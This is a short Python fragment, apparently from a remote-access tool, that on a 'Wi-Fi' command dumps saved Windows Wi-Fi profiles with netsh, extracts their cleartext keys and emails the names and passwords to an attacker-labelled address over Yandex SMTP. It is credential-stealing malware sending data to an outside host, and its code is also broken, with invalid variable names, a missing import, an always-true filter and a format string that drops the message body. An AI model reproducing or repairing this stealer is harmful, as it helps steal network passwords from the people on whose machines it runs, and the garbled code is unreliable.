import subprocess
import time

if server_command == 'Wi-Fi':

	data = subprocess.check_output(['netsh','wlan','show','profiles']).decode('cp866').split('\n')

	Wi-Fis = [line.split(':')[1][1:-1] for line in data if'all profiles' in line]

	for Wi-Fi in Wi-Fis:
		results = subprocess.check_output(['netsh','wlan','show','profiles',Wi-Fi,'key=clear']).decode('cp866').split('\n')

		results = [line.split(':')[1][1:-1] for line in results if 'into key']

		try:
			email = 'hackermail@domain.com'
			password = '***'
			dest_email = 'dest@domain.com'
			subject = 'Wi-Fi'
			email_text = (f'name of net: {Wi-Fi}, passwd: {results[0]}')
			message = 'From {}\nTo: {}\nSubject: {}\n\n'.format(email,dest_email,subject,email_text)
			server = smtp.SMTP_SSL('smtp.yandex.com')
			server.set_debuglevel(1)
			server.ehlo(email)
			server.login(email,password)
			server.auth_plain()
			server.sendmail(email,dest_email,message)
			server.quit()
		except IndexError:
			email = 'hackermail@domain.com'
			password = '***'
			dest_email = 'dest@domain.com'
			subject = 'Wi-Fi'
			email_text = (f'name of net: {Wi-Fi}, passwd: no results')
			message = 'From {}\nTo: {}\nSubject: {}\n\n'.format(email,dest_email,subject,email_text)
			server = smtp.SMTP_SSL('smtp.yandex.com')
			server.set_debuglevel(1)
			server.ehlo(email)
			server.login(email,password)
			server.auth_plain()
			server.sendmail(email,dest_email,message)
			server.quit()




